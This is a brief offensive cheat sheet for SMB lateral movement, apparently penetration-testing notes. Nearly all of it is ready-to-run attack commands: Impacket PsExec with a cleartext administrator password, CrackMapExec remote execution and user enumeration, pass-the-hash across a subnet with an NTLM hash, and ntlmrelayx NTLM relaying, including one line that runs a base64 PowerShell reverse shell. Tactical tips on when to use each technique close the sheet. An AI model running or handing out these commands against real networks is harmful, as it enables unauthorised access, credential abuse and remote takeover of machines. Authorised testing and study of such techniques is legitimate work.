# SMB Lateral Movement

Goal: Move between machines using SMB credentials.

---

# Impacket PsExec

impacket-psexec administrator:'Password123!'@10.10.110.17

---

# CrackMapExec Remote Command Execution

crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

---

# CrackMapExec Logged-On Users

crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --loggedon-users

---

# CrackMapExec Local Auth

crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

---

# SMB Relay

impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>'

---

# Tactical Notes

- Prefer pass-the-hash if hashes available.
- Check logged-on users before lateral.
- NTLM relay requires LLMNR/NBNS enabled.
